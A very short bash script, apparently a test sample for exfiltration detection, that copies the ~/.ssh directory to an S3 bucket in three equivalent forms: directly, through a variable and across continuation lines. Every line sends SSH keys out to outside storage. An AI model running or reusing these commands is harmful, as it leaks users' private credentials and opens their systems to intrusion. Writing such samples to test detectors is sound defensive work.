#!/bin/bash
aws s3 cp ~/.ssh s3://bucket/ --recursive
D=~/.ssh
aws s3 cp $D s3://bucket/ --recursive
aws s3 \
  cp ~/.ssh s3://bucket/ --recursive
